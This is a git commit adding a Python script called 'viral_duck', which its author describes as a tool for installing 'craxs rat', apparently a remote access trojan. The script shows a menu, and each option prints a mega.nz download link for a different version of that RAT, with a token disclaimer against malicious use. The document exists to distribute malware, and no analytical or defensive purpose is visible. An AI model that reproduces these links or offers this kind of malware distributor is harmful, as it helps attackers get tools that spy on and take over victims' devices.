bb0401252c39f2d2550e6263ebf31d510faf2248
madara7xi <153654213+madara7xi@users.noreply.github.com>
2023-12-12 13:12:39 -0500

    viral_duck
    viral_duck it is a tols for install craxs rat
    install:
    apt install python
    cd viral_duck
    python viral_duck.py

---
+++ viral_duck.py
@@ -0,0 +1,56 @@
+import os
+import shutil
+import time
+print("""
+       __________________________________________________________
+       *                     VIRAL DUCK                         *      
+       *                 _____                                  *
+       *               >( .   )------                           *
+       *                (___________/                           *
+       *                                                        *
+       *     Please do not use the tool for any malicious       *
+       *        purposes.                                       *   
+       *                                                        *
+       *                                                        *
+       *________________________________________________________* 
+                    """)
+class Textcolor :
+      RESET ='\033[0m'
+      RED = '\033[31m'
+      GREEN = '\033[32m'
+      YELLO = '\033[33m'
+print(f"{Textcolor.RED}MADE by: madara_7xi{Textcolor.RESET}")
+print(f"{Textcolor.RED}Instagram: mohamed_7xi{Textcolor.RESET}")
+print(f"{Textcolor.GREEN}1-to install craxs rat v3{Textcolor.RESET}")
+print(f"{Textcolor.GREEN}2-to install craxs rat v4.9{Textcolor.RESET}")
+print(f"{Textcolor.GREEN}3-to install craxs rat v5.1{Textcolor.RESET}")
+print(f"{Textcolor.GREEN}4-to install craxs rat v5.2{Textcolor.RESET}")
+print(f"{Textcolor.GREEN}5-to install craxs rat v6.7{Textcolor.RESET}")
+print(f"{Textcolor.GREEN}6- Aboit!{Textcolor.RESET}")
+print(f"{Textcolor.YELLO}    exit  {Textcolor.RESET}")
+a=input(" # Choose   :")
+if a == "exit" :
+       print("wait")
+       time.sleep(3)
+elif a == "6":
+        time.sleep(2)
+        print("viral_duck it is a tols for install craxs rat")
+        print("what is craxs rat !")   
+        print("my tiktok : madara_7xi")         
+elif a == "5" :
+        time.sleep(2)
+        print("thenk you for use viral duck copy the url and pase for your windows browser")
+        print("url : https://mega.nz/folder/cXllRLgA#KdY5x12QPuss7nbduRKqHw/file/FTExDRiJ")
+elif a == "4" :
+        print("thenk you for use viral duck copy the url and pase for your windows browser")
+        print("url : https://mega.nz/folder/cXllRLgA#KdY5x12QPuss7nbduRKqHw/file/FbNUDBrK")
+elif a == "3" :
+        print("thenk you for use viral duck copy the url and pase for your windows browser")
+        print("url : https://mega.nz/folder/cXllRLgA#KdY5x12QPuss7nbduRKqHw/file/EO1EmLKa")
+elif a == "2" :
+        print("thenk you for use viral duck copy the url and pase for your windows browser")
+        print("url : https://mega.nz/folder/cXllRLgA#KdY5x12QPuss7nbduRKqHw/file/xWkXEAhQ")
+elif a == "1":
+        print("thenk you for use viral duck copy the url and pase for your windows browser")
+        print("url : https://mega.nz/folder/cXllRLgA#KdY5x12QPuss7nbduRKqHw/file/ND8XjDyZ")
+       
